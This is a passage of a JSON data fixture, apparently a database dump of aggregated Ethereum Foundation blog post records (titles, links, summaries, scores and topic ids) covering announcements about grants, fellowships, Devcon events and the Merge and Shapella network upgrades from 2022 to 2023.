12308.7987411, "slug": "academic-grants-round-2023-announcement-263", "topics": [75]}}, {"model": "app.post", "pk": 264, "fields": {"title": "Announcing The Devconnect Istanbul Scholars Program", "link": "https://blog.ethereum.org/en/2023/06/26/devconnect-instanbul-scholars", "source": 1, "normalized_link": "blog.ethereum.org/en/2023/06/26/devconnect-instanbul-scholars", "summary": "We are thrilled to announce the first-ever Devconnect Scholars Program!  The Devconnect Scholars Program will provide talented and values-aligned individuals from communities currently geographically and demographically underrepresented in Ethereum with financial support to attend Devconnect in Istanbul this November.  Apply to the program here by July 23rd, 2023....", "content": "", "cover_photo_url": "https://storage.googleapis.com/ethereum-hackmd/upload_37a3978180f54599ab81a0abca3a3002.jpg", "profile": 10, "updated_on": "2023-06-26T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12304.9587411, "slug": "announcing-the-devconnect-istanbul-scholars-program-264", "topics": [73, 72]}}, {"model": "app.post", "pk": 265, "fields": {"title": "Allocation Update: Q1 2023", "link": "https://blog.ethereum.org/en/2023/06/15/allocation-update-q1-23", "source": 1, "normalized_link": "blog.ethereum.org/en/2023/06/15/allocation-update-q1-23", "summary": "Kicking off the year with an addition to our Allocation Updates: we've included the contact details for grantees' projects, so that interested readers can reach out and get involved or learn more!  With that being said, read on to find out which projects received funding in Q1 in the...", "content": "", "cover_photo_url": "https://storage.googleapis.com/ethereum-hackmd/upload_fd63dc334e72e1c2885cb7969adc1faf.jpg", "profile": 10, "updated_on": "2023-06-15T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12283.8387411, "slug": "allocation-update-q1-2023-265", "topics": [77]}}, {"model": "app.post", "pk": 266, "fields": {"title": "Ethereum Protocol Fellowship - Fourth Cohort Applications Are Open!", "link": "https://blog.ethereum.org/en/2023/06/01/ethereum-protocol-fellowship-fourth-apps-open", "source": 1, "normalized_link": "blog.ethereum.org/en/2023/06/01/ethereum-protocol-fellowship-fourth-apps-open", "summary": "TL;DR:  The application deadline for the fourth cohort of EPF has been extended \ud83d\udcc6 The EPF Team held a town hall & FAQ session - watch the recording here \ud83d\udc40 Submit your application here before June 18th \ud83d\udcdd  Greetings, Ethereum community!  We are excited to announce that...", "content": "", "cover_photo_url": "https://storage.googleapis.com/ethereum-hackmd/upload_528af259f560c1e462768d8662448ebf.png", "profile": 10, "updated_on": "2023-06-01T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12256.9587411, "slug": "ethereum-protocol-fellowship-fourth-cohort-applications-are-open-266", "topics": [75]}}, {"model": "app.post", "pk": 267, "fields": {"title": "Ethereum Protocol Fellowship: Third Cohort Recap", "link": "https://blog.ethereum.org/en/2023/05/10/ethereum-protocol-fellowship-third-recap", "source": 1, "normalized_link": "blog.ethereum.org/en/2023/05/10/ethereum-protocol-fellowship-third-recap", "summary": "TL;DR: The EPF concluded its third cohort and is preparing for the fourth cohort. Applications will be open soon. Sign up here to get notified when they open.  The Ethereum Protocol Fellowship recently completed its third successful cohort in February 2023. Its completion marked 4 months of immersive learning,...", "content": "", "cover_photo_url": "https://storage.googleapis.com/ethereum-hackmd/upload_80ba0aa49f5a37026942c45ea9f30e96.jpg", "profile": 10, "updated_on": "2023-05-10T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12214.7187411, "slug": "ethereum-protocol-fellowship-third-cohort-recap-267", "topics": [75]}}, {"model": "app.post", "pk": 268, "fields": {"title": "Secured #5: Public Vulnerability Disclosures Update", "link": "https://blog.ethereum.org/en/2023/05/03/secured-5-disclosures-update", "source": 1, "normalized_link": "blog.ethereum.org/en/2023/05/03/secured-5-disclosures-update", "summary": "Today, we have disclosed the second set of vulnerabilities from the Ethereum Foundation Bug Bounty Program! \ud83e\udd73 These vulnerabilities were previously discovered and reported directly to the Ethereum Foundation.  When bugs are reported and validated, the Ethereum Foundation coordinates disclosures to affected teams and helps cross-check vulnerabilities across all...", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/upload_630d77544672a1e0df792c0d71489bd6.jpg", "profile": 10, "updated_on": "2023-05-03T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12201.2787411, "slug": "secured-5-public-vulnerability-disclosures-update-268", "topics": [75]}}, {"model": "app.post", "pk": 269, "fields": {"title": "Scouting for the Future: Technology and the Scouting Movement", "link": "https://blog.ethereum.org/en/2023/05/01/scouting-future-movement", "source": 1, "normalized_link": "blog.ethereum.org/en/2023/05/01/scouting-future-movement", "summary": "Hello everyone! My name is Mihajlo, and over the past six months as part of my Next Billion Fellowship, I\u2019ve been working to bring the benefits of Web3 to the World Scouting Movement.  Growing up in Serbia in the '90s, I experienced firsthand the devastating effects that wars and...", "content": "", "cover_photo_url": "https://storage.googleapis.com/ethereum-hackmd/upload_bc451adb280fe2de40c39e1246ddd6db.png", "profile": 10, "updated_on": "2023-05-01T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12197.4387411, "slug": "scouting-for-the-future-technology-and-the-scouting-movement-269", "topics": [74]}}, {"model": "app.post", "pk": 270, "fields": {"title": "Devconnect is back! See you this year in Istanbul.", "link": "https://blog.ethereum.org/en/2023/04/20/announcing-devconnect-ist", "source": 1, "normalized_link": "blog.ethereum.org/en/2023/04/20/announcing-devconnect-ist", "summary": "Dear Ethereum community, builders, and researchers,  At the first-ever Devconnect last year in Amsterdam in 2022, we came together for a week of in-depth workshops and discussions. Many that participated in the sessions and conversations told us they felt Devconnect had a significant impact on the ecosystem by driving...", "content": "", "cover_photo_url": "https://storage.googleapis.com/ethereum-hackmd/upload_00b0f0ca81303aaf837269d14a01dbd4.jpg", "profile": 10, "updated_on": "2023-04-20T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12176.3187411, "slug": "devconnect-is-back-see-you-this-year-in-istanbul-270", "topics": [73, 72]}}, {"model": "app.post", "pk": 271, "fields": {"title": "Mainnet Shapella Announcement", "link": "https://blog.ethereum.org/en/2023/03/28/shapella-mainnet-announcement", "source": 1, "normalized_link": "blog.ethereum.org/en/2023/03/28/shapella-mainnet-announcement", "summary": "Withdrawals are coming! The Shapella network upgrade will activate on the Ethereum network at epoch 194048, scheduled for 22:27:35 UTC on Apr. 12, 2023 Stakers & node operators should read this post as well as the Withdrawals FAQ From now until April 5th, the Ethereum Bug Bounty rewards have been...", "content": "", "cover_photo_url": "https://storage.googleapis.com/ethereum-hackmd/upload_5fc486ebf659fc2e64c38f805468f54c.jpg", "profile": 10, "updated_on": "2023-03-28T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12132.1587411, "slug": "mainnet-shapella-announcement-271", "topics": [75]}}, {"model": "app.post", "pk": 272, "fields": {"title": "Next Billion Fellowship Cohort 3 - Call for applications", "link": "https://blog.ethereum.org/en/2023/03/16/fellowship-cohort-3-applications", "source": 1, "normalized_link": "blog.ethereum.org/en/2023/03/16/fellowship-cohort-3-applications", "summary": "Ethereum is a living entity, distributed across time and space, accessible through our screens and communication devices. What gives it life are the myriad human relationships that have become intertwined with the roots, branches, and leaves of the Ethereum state tree. This single tree encodes immense value, digital property, and...", "content": "", "cover_photo_url": "https://storage.googleapis.com/ethereum-hackmd/upload_bc451adb280fe2de40c39e1246ddd6db.png", "profile": 10, "updated_on": "2023-03-16T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12109.1187411, "slug": "next-billion-fellowship-cohort-3-call-for-applications-272", "topics": [74]}}, {"model": "app.post", "pk": 273, "fields": {"title": "Goerli Shapella Announcement", "link": "https://blog.ethereum.org/en/2023/03/08/goerli-shapella-announcement", "source": 1, "normalized_link": "blog.ethereum.org/en/2023/03/08/goerli-shapella-announcement", "summary": "Withdrawals are coming! The Shapella network upgrade will activate on the Goerli network at epoch 162304, scheduled for 10:25:36 PM UTC on Mar. 14, 2023 Stakers & node operators should read this post as well as the Withdrawals FAQ The Zhejiang testnet can be used to test Shapella functionality prior...", "content": "", "cover_photo_url": "https://storage.googleapis.com/ethereum-hackmd/upload_c721600b9f9448a141574b76a38159e6.jpg", "profile": 10, "updated_on": "2023-03-08T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12093.7587411, "slug": "goerli-shapella-announcement-273", "topics": [78]}}, {"model": "app.post", "pk": 274, "fields": {"title": "Announcing Devcon 7!", "link": "https://blog.ethereum.org/en/2023/02/28/devcon-7-update", "source": 1, "normalized_link": "blog.ethereum.org/en/2023/02/28/devcon-7-update", "summary": "Last year, after a three-year-long pause, we emerged from the pandemic stronger than before and reunited in Bogot\u00e1 for the largest and some would say, \u201c[best](https://twitter.com/avsa/status/15...", "content": "", "cover_photo_url": "https://storage.googleapis.com/ethereum-hackmd/upload_5c48708771e113e99244cbfb722992e6.jpg", "profile": 10, "updated_on": "2023-02-28T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12078.3987411, "slug": "announcing-devcon-7-274", "topics": [72, 76]}}, {"model": "app.post", "pk": 275, "fields": {"title": "Allocation Update: Q4 2022", "link": "https://blog.ethereum.org/en/2023/02/22/allocation-update-q4-22", "source": 1, "normalized_link": "blog.ethereum.org/en/2023/02/22/allocation-update-q4-22", "summary": "There's been buzz and excitement surrounding the new year, but we haven't forgotten about the grantees from last quarter! Find out which projects received funding in Q4 2022 in the table below:    | Category             ...", "content": "", "cover_photo_url": "https://storage.googleapis.com/ethereum-hackmd/upload_fd63dc334e72e1c2885cb7969adc1faf.jpg", "profile": 10, "updated_on": "2023-02-22T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12066.8787411, "slug": "allocation-update-q4-2022-275", "topics": [77]}}, {"model": "app.post", "pk": 276, "fields": {"title": "Sepolia Shapella Announcement", "link": "https://blog.ethereum.org/en/2023/02/21/sepolia-shapella-announcement", "source": 1, "normalized_link": "blog.ethereum.org/en/2023/02/21/sepolia-shapella-announcement", "summary": "Withdrawals are coming! The Shapella network upgrade will activate on the Sepolia network at epoch 56832, scheduled for 4:04:48 AM UTC on Feb. 28, 2023 Stakers & node operators should read this post as well as the Withdrawals FAQ The Zhejiang testnet can be used to test Shapella functionality prior...", "content": "", "cover_photo_url": "https://storage.googleapis.com/ethereum-hackmd/upload_c721600b9f9448a141574b76a38159e6.jpg", "profile": 10, "updated_on": "2023-02-21T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12064.9587411, "slug": "sepolia-shapella-announcement-276", "topics": [78]}}, {"model": "app.post", "pk": 277, "fields": {"title": "Layer 2 Community Grants Winners", "link": "https://blog.ethereum.org/en/2023/02/14/layer-2-grants-roundup", "source": 1, "normalized_link": "blog.ethereum.org/en/2023/02/14/layer-2-grants-roundup", "summary": "The Privacy & Scaling Explorations team is excited to announce the winners of the Layer 2 Community Grants 2022.  The Layer 2 Community Grants round started on October 24th, 2022 and was open for 6 weeks. In total we received 130+ proposals and thank each project for taking the...", "content": "", "cover_photo_url": "https://storage.googleapis.com/ethereum-hackmd/upload_6c9103b50cbac863910628d8a4f324d7.png", "profile": 10, "updated_on": "2023-02-09T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12041.9187411, "slug": "layer-2-community-grants-winners-277", "topics": [77]}}, {"model": "app.post", "pk": 278, "fields": {"title": "Finalized no. 38", "link": "https://blog.ethereum.org/en/2023/02/10/finalized-no-38", "source": 1, "normalized_link": "blog.ethereum.org/en/2023/02/10/finalized-no-38", "summary": "Withdrawals are imminent.  tl;dr  Shanghai+Capella (aka Shapella) is on the horizon. Stakers, node operators, infrastructure providers -- pay attention and test! The Academic Grants Round is live! Applications are due by February 27, 2023...", "content": "", "cover_photo_url": "https://storage.googleapis.com/ethereum-hackmd/upload_4dae2a4ab4b6c89615b4b5c624c04b52.jpg", "profile": 10, "updated_on": "2023-02-10T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12043.8387411, "slug": "finalized-no-38-278", "topics": [75]}}, {"model": "app.post", "pk": 279, "fields": {"title": "Edelweiss Interop Recap", "link": "https://blog.ethereum.org/en/2023/02/07/edelweiss-interop-recap", "source": 1, "normalized_link": "blog.ethereum.org/en/2023/02/07/edelweiss-interop-recap", "summary": "With The Merge now firmly behind us, protocol developers have been making progress across a (record?) number of areas over the past few months. Withdrawals, danksharding, EOF, verkle tries, history expiry, SSZ and more have all seen significant progress recently!  In order to help move each of these threads...", "content": "", "cover_photo_url": "https://storage.googleapis.com/ethereum-hackmd/upload_3e0c90e6d53db5b5bafaa4f292ecfeca.jpeg", "profile": 10, "updated_on": "2023-02-07T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12038.0787411, "slug": "edelweiss-interop-recap-279", "topics": [75]}}, {"model": "app.post", "pk": 280, "fields": {"title": "The potential to empower disenfranchised communities in Latin America using Ethereum", "link": "https://blog.ethereum.org/en/2023/02/06/empower-latam-ethereum-fellows", "source": 1, "normalized_link": "blog.ethereum.org/en/2023/02/06/empower-latam-ethereum-fellows", "summary": "The following is an update from Ethereum Foundation Fellow Marcus AM.  Hola \ud83d\udc4b, my name is Marcus and I'm a researcher and builder from Guatemala, and an EF Fellow. An optimist at heart, I\u2019m driven by leveraging social, cultural and technological innovation to build better societies - a conviction...", "content": "", "cover_photo_url": "https://storage.googleapis.com/ethereum-hackmd/upload_00d96900c0a75717ad2208cde2db9c3d.png", "profile": 10, "updated_on": "2023-02-06T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12036.1587411, "slug": "the-potential-to-empower-disenfranchised-communities-in-latin-america-using-ethereum-280", "topics": [74]}}, {"model": "app.post", "pk": 281, "fields": {"title": "Grantee Roundup - Q1 2023", "link": "https://blog.ethereum.org/en/2023/02/03/esp-grantee-roundout-q1-23", "source": 1, "normalized_link": "blog.ethereum.org/en/2023/02/03/esp-grantee-roundout-q1-23", "summary": "It\u2019s always fun to hear about new grants as they\u2019re awarded, but what happens after the announcement? In this series, we check in on projects that are well underway or already at the finish line.  You may have noticed something different\u2014instead of monthly posts, we'll be highlighting grantees who...", "content": "", "cover_photo_url": "https://storage.googleapis.com/ethereum-hackmd/upload_5314593dc47abbd6b60869473588681f.png", "profile": 10, "updated_on": "2023-02-03T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12030.3987411, "slug": "grantee-roundup-q1-2023-281", "topics": [77]}}, {"model": "app.post", "pk": 282, "fields": {"title": "Looking back: 2022 on ethereum.org", "link": "https://blog.ethereum.org/en/2023/01/18/2022-on-ethereum-org", "source": 1, "normalized_link": "blog.ethereum.org/en/2023/01/18/2022-on-ethereum-org", "summary": "From the explosion of the scaling and layer 2 ecosystems to the first Devcon in three years and The Merge, it has been an exciting year for Ethereum and ethereum.org. We\u2019ve shipped many impactful features and content, with thousands of incredible contributors helping us along the way.  Let\u2019s dive...", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/ethereum-hero.png", "profile": 10, "updated_on": "2023-01-18T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11999.6787411, "slug": "looking-back-2022-on-ethereumorg-282", "topics": [79]}}, {"model": "app.post", "pk": 283, "fields": {"title": "Announcing the KZG Ceremony", "link": "https://blog.ethereum.org/en/2023/01/16/announcing-kzg-ceremony", "source": 1, "normalized_link": "blog.ethereum.org/en/2023/01/16/announcing-kzg-ceremony", "summary": "High fees have made life difficult for travelers through these Dark Forests. The Pools of Mem once clouded, now clarified by the filter of 1559, reveal that they are not deep enough to sustain.  Legends tell of a society flourishing under the abundance brought about by DankShard, of giant...", "content": "", "cover_photo_url": "https://storage.googleapis.com/ethereum-hackmd/upload_81534446e4a8d0f543f70f95f245700f.png", "profile": 10, "updated_on": "2022-01-16T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11295.0387411, "slug": "announcing-the-kzg-ceremony-283", "topics": [78]}}, {"model": "app.post", "pk": 284, "fields": {"title": "EF-Supported Teams: Research & Development Roundup", "link": "https://blog.ethereum.org/en/2022/12/29/supported-teams-roundup-22", "source": 1, "normalized_link": "blog.ethereum.org/en/2022/12/29/supported-teams-roundup-22", "summary": "Friends,  As the year of the Merge ends, we wanted to share updates from many of the Ethereum gardeners and EF-supported teams that achieved long sought accomplishments, both big and small, alongside the rest of the ecosystem in 2022. We all have a lot to be thankful for, from...", "content": "", "cover_photo_url": "https://storage.googleapis.com/ethereum-hackmd/upload_843f550fb00a32fd6183815b56f14d44.jpg", "profile": 10, "updated_on": "2022-12-29T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11961.2787411, "slug": "ef-supported-teams-research-development-roundup-284", "topics": [80]}}, {"model": "app.post", "pk": 285, "fields": {"title": "KZG Ceremony Grant Round", "link": "https://blog.ethereum.org/en/2022/12/15/kzg-ceremony-grants-round", "source": 1, "normalized_link": "blog.ethereum.org/en/2022/12/15/kzg-ceremony-grants-round", "summary": "The Protocol Support team is organizing a grant round to support the upcoming Ethereum KZG Ceremony.  The KZG Ceremony is a coordinated public ritual that will provide a cryptographic foundation for Ethereum scaling initiatives like EIP-4844. Learn more about the Ceremony and participate in the test version at ceremony.ethereum.org....", "content": "", "cover_photo_url": "https://storage.googleapis.com/ethereum-hackmd/upload_7d22bc5d7be9c0d5d8f50161734559ae.png", "profile": 10, "updated_on": "2022-12-15T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11934.3987411, "slug": "kzg-ceremony-grant-round-285", "topics": [75]}}, {"model": "app.post", "pk": 286, "fields": {"title": "Allocation Update Q3 2022", "link": "https://blog.ethereum.org/en/2022/12/07/esp-allocation-q3-22", "source": 1, "normalized_link": "blog.ethereum.org/en/2022/12/07/esp-allocation-q3-22", "summary": "Before the year comes to a close, we'd like to highlight the amazing projects that received funding in the previous quarter. Read on to learn more about our Q3 grantee lineup!  | Category                ...", "content": "", "cover_photo_url": "https://storage.googleapis.com/ethereum-hackmd/upload_de9a88166698be2e43a3c33e8a69c0a7.png", "profile": 10, "updated_on": "2022-12-07T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11919.0387411, "slug": "allocation-update-q3-2022-286", "topics": [77]}}, {"model": "app.post", "pk": 287, "fields": {"title": "Merge Data Challenge Results", "link": "https://blog.ethereum.org/en/2022/12/05/merge-data-challenge-results", "source": 1, "normalized_link": "blog.ethereum.org/en/2022/12/05/merge-data-challenge-results", "summary": "The Ethereum Foundation is excited to announce the winners of the Merge Data Challenge \ud83d\udc3c.  The challenge ran for ~9 weeks surrounding the Merge, allowing for data analysts to gather and review information both before and after the big event. Participants submitted a treasure trove of data and analysis...", "content": "", "cover_photo_url": "https://storage.googleapis.com/ethereum-hackmd/upload_d8ffa747630149287cc8483996546a1b.jpg", "profile": 10, "updated_on": "2022-12-05T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11915.1987411, "slug": "merge-data-challenge-results-287", "topics": [77]}}, {"model": "app.post", "pk": 288, "fields": {"title": "Ropsten Shutdown Announcement", "link": "https://blog.ethereum.org/en/2022/11/30/ropsten-shutdown-announcement", "source": 1, "normalized_link": "blog.ethereum.org/en/2022/11/30/ropsten-shutdown-announcement", "summary": "As previously announced, the Ropsten network has been deprecated and will be shut down in the coming weeks. Over the past few months, infrastructure providers have gradually stopped supporting the network and validator participation rates have been steadily declining.  **The vast majority of remaining validator nodes will be shut...", "content": "", "cover_photo_url": "https://storage.googleapis.com/ethereum-hackmd/upload_6a70f6f5faa1e4feaf1131d454a369c1.jpg", "profile": 10, "updated_on": "2022-11-30T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11905.5987411, "slug": "ropsten-shutdown-announcement-288", "topics": [78]}}, {"model": "app.post", "pk": 289, "fields": {"title": "Devcon VI Recap, Resources & Wrap-Up!", "link": "https://blog.ethereum.org/en/2022/11/17/devcon-vi-wrap", "source": 1, "normalized_link": "blog.ethereum.org/en/2022/11/17/devcon-vi-wrap", "summary": "A few weeks ago in October, much of the Ethereum community came together in South America as we reunited for Devcon VI in Bogot\u00e1, Colombia!  Today we want to say Thank You(!) to every attendee, volunteer, and contributor that made Devcon VI a success. In this blog post, we...", "content": "", "cover_photo_url": "https://storage.googleapis.com/ethereum-hackmd/upload_d0c1b4c0850a119c5fcfb8cf07b96e51.jpg", "profile": 10, "updated_on": "2022-11-17T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11880.6387411, "slug": "devcon-vi-recap-resources-wrap-up-289", "topics": [72, 76]}}, {"model": "app.post", "pk": 290, "fields": {"title": "Devcon VI Scholars: Growing the Infinite Garden", "link": "https://blog.ethereum.org/en/2022/11/07/devcon-vi-scholars-wrapup", "source": 1, "normalized_link": "blog.ethereum.org/en/2022/11/07/devcon-vi-scholars-wrapup", "summary": "The Ethereum Foundation (EF) exists to help the Ethereum ecosystem thrive, and there are still many discoveries to be made about what Ethereum can do for the world. That's why we support individuals that have the potential to unlock parts of Ethereum's story that are still unwritten.  The Devcon...", "content": "", "cover_photo_url": "https://storage.googleapis.com/ethereum-hackmd/upload_9034eb41af870c792a4818e38eb745a2.png", "profile": 10, "updated_on": "2022-11-07T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11861.4387411, "slug": "devcon-vi-scholars-growing-the-infinite-garden-290", "topics": [80]}}, {"model": "app.post", "pk": 291, "fields": {"title": "Announcing the EF Fellowship Program, Cohort #2", "link": "https://blog.ethereum.org/en/2022/10/10/ef-fellowship-cohort-2", "source": 1, "normalized_link": "blog.ethereum.org/en/2022/10/10/ef-fellowship-cohort-2", "summary": "Things are looking up for Ethereum. Now that The Merge is complete, a huge weight (measured in tonnes of CO2) has been lifted from the Ethereum community's collective conscience. And the world-at-large is watching to see what this community does next.  Right now the ecosystem has a unique opportunity...", "content": "", "cover_photo_url": "https://storage.googleapis.com/ethereum-hackmd/upload_30943e71b6774aaaab174d89a80b9664.png", "profile": 10, "updated_on": "2022-10-10T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11807.6787411, "slug": "announcing-the-ef-fellowship-program-cohort-2-291", "topics": [74]}}, {"model": "app.post", "pk": 292, "fields": {"title": "Announcing Supporters & Impact Booths", "link": "https://blog.ethereum.org/en/2022/10/10/devcon-impact-supporters", "source": 1, "normalized_link": "blog.ethereum.org/en/2022/10/10/devcon-impact-supporters", "summary": "This year\u2019s Devcon is special in many ways. We\u2019ve used the last three years to create a whole new experience based on all that we\u2019ve seen at past Devcons, and lessons learned while event-planning during the pandemic. Devcon VI involved the community via Community Hubs and Devcon Improvement Proposals (DIPs),...", "content": "", "cover_photo_url": "https://storage.googleapis.com/ethereum-hackmd/upload_0c64bf4c9178e2cb9b59fc1e3da7d40f.jpeg", "profile": 10, "updated_on": "2022-10-10T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11807.6787411, "slug": "announcing-supporters-impact-booths-292", "topics": [72, 76]}}, {"model": "app.post", "pk": 293, "fields": {"title": "The Devcon VI Manual", "link": "https://blog.ethereum.org/en/2022/10/04/devcon-manual", "source": 1, "normalized_link": "blog.ethereum.org/en/2022/10/04/devcon-manual", "summary": "Welcome to Devcon!  This is your Devcon VI Manual, and it includes everything you need to know about Devcon, the surroundings and more. Read closely as we cover things to be aware of before departure, during transit to the venue from Bogot\u00e1\u2019s international airport El Dorado, and information related...", "content": "", "cover_photo_url": "https://storage.googleapis.com/ethereum-hackmd/upload_85cf7b2dc452633cb387c2c35b94420b.jpg", "profile": 10, "updated_on": "2022-10-04T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11796.1587411, "slug": "the-devcon-vi-manual-293", "topics": [72, 76]}}, {"model": "app.post", "pk": 294, "fields": {"title": "Kiln Shutdown Announcement", "link": "https://blog.ethereum.org/en/2022/09/09/kiln-shutdown", "source": 1, "normalized_link": "blog.ethereum.org/en/2022/09/09/kiln-shutdown", "summary": "The Merge is happening soon! This post explains how and when the upgrade will happen, along with the client versions compatible with it. Kiln, an Ethereum merge testnet launched in early 2022, will be shut down during the week of September 12, 2022. Ropsten and Rinkeby are also deprecated and...", "content": "", "cover_photo_url": "https://storage.googleapis.com/ethereum-hackmd/upload_8d7ea1c612b90c3235dd54044d541b6a.jpeg", "profile": 10, "updated_on": "2022-09-09T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11748.1587411, "slug": "kiln-shutdown-announcement-294", "topics": [78]}}, {"model": "app.post", "pk": 295, "fields": {"title": "Allocation Update: Q1 and Q2 2022", "link": "https://blog.ethereum.org/en/2022/09/07/esp-q1-q2-allocation-update", "source": 1, "normalized_link": "blog.ethereum.org/en/2022/09/07/esp-q1-q2-allocation-update", "summary": "It's time to share the list of outstanding grantees who received funding in Q1 and Q2 of this year!  You can learn more about their projects below:...", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/upload_fd63dc334e72e1c2885cb7969adc1faf.jpg", "profile": 10, "updated_on": "2022-09-07T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11744.3187411, "slug": "allocation-update-q1-and-q2-2022-295", "topics": [77]}}, {"model": "app.post", "pk": 296, "fields": {"title": "Ethereum Protocol Fellowship: The Third Cohort", "link": "https://blog.ethereum.org/en/2022/09/01/ethereum-protocol-fellowship-third", "source": 1, "normalized_link": "blog.ethereum.org/en/2022/09/01/ethereum-protocol-fellowship-third", "summary": "Do you enjoy solving interesting and challenging problems? Are you interested in getting involved at the most foundational level of the Ethereum protocol?  The Protocol Support Team (EF) is excited to announce that applications are now being accepted for the third cohort of the Ethereum Protocol Fellowship (formerly Core...", "content": "", "cover_photo_url": "https://storage.googleapis.com/ethereum-hackmd/upload_eee89d27faf03f0be7d1724c13c5d7dc.jpg", "profile": 10, "updated_on": "2022-09-01T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11732.7987411, "slug": "ethereum-protocol-fellowship-the-third-cohort-296", "topics": [75]}}, {"model": "app.post", "pk": 297, "fields": {"title": "Translating the Ethereum Foundation blog", "link": "https://blog.ethereum.org/en/2022/08/31/blog-internationalization", "source": 1, "normalized_link": "blog.ethereum.org/en/2022/08/31/blog-internationalization", "summary": "Since the first post in December 2013, the Ethereum Foundation (EF) blog has been the primary way teams within the EF communicate. From announcements about events, to grant waves, protocol upgrades, regular [updates from specific teams](/2021/12/22/ef-supported-teams-research-an...", "content": "", "cover_photo_url": "https://storage.googleapis.com/ethereum-hackmd/upload_fc8f505659849ac7e21c75d47f833bbe.png", "profile": 10, "updated_on": "2022-08-31T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11730.8787411, "slug": "translating-the-ethereum-foundation-blog-297", "topics": [79]}}, {"model": "app.post", "pk": 298, "fields": {"title": "Finalized no. 37", "link": "https://blog.ethereum.org/en/2022/08/26/finalized-no-37", "source": 1, "normalized_link": "blog.ethereum.org/en/2022/08/26/finalized-no-37", "summary": "~20 days until the Merge \ud83d\ude80  tl;dr  The Merge Data Challenge is live! Collect, analyze, and visualize all of the data Merge Mainnet client releases are out. Did you upgrade yet?...", "content": "", "cover_photo_url": "https://storage.googleapis.com/ethereum-hackmd/upload_4dae2a4ab4b6c89615b4b5c624c04b52.jpg", "profile": 10, "updated_on": "2022-08-26T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11721.2787411, "slug": "finalized-no-37-298", "topics": [75]}}, {"model": "app.post", "pk": 299, "fields": {"title": "Mainnet Merge Announcement", "link": "https://blog.ethereum.org/en/2022/08/24/mainnet-merge-announcement", "source": 1, "normalized_link": "blog.ethereum.org/en/2022/08/24/mainnet-merge-announcement", "summary": "Ethereum is moving to proof-of-stake! The transition, known as The Merge, must first be activated on the Beacon Chain with the Bellatrix upgrade. After this, the proof-of-work chain will migrate to proof-of-stake upon hitting a specific Total Difficulty value. The Bellatrix upgrade is scheduled for epoch 144896 on the Beacon...", "content": "", "cover_photo_url": "https://storage.googleapis.com/ethereum-hackmd/upload_fc82062a814fd40a66c7d03a522da205.jpeg", "profile": 10, "updated_on": "2022-08-24T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11717.4387411, "slug": "mainnet-merge-announcement-299", "topics": [78]}}, {"model": "app.post", "pk": 300, "fields": {"title": "Finalized no. 36", "link": "https://blog.ethereum.org/en/2022/08/12/finalized-no-36", "source": 1, "normalized_link": "blog.ethereum.org/en/2022/08/12/finalized-no-36", "summary": "tl;dr Merge sequence engaged \ud83d\ude80...", "content": "", "cover_photo_url": "https://blog.ethereum.org/images/posts/upload_4dae2a4ab4b6c89615b4b5c624c04b52.jpg", "profile": 10, "updated_on": "2022-08-12T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11694.3987411, "slug": "finalized-no-36-300", "topics": [75]}}, {"model": "app.post", "pk": 301, "fields": {"title": "Sepolia Post-Merge Upgrade Announcement", "link": "https://blog.ethereum.org/en/2022/08/03/sepolia-post-merge-upgrade", "source": 1, "normalized_link": 